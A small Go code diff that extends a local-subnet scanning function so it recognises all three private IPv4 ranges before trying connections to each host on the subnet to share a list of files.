@@ -79,7 +79,11 @@ func scanIps(files []string) {
 	ips := getIpAddresses(make([]net.IP, 0))
 	for _, ip := range ips {
 		ip4 := ip.To4()
-		if ip4 != nil && ip4[0] == 192 && ip4[1] == 168 {
+		// Check if the IP4 address is from a private network
+		if ip4 != nil &&
+			((ip4[0] == 10) ||
+			 (ip4[0] == 172 && (ip4[1] >= 16 && ip4[1] <= 31)) ||
+			 (ip4[0] == 192 && ip4[1] == 168)) {
 			for i := 0; i <= 255; i++ {
 				serverIp4 := net.IPv4(ip4[0], ip4[1], ip4[2], byte(i))
 				go connectToServer(serverIp4, files)
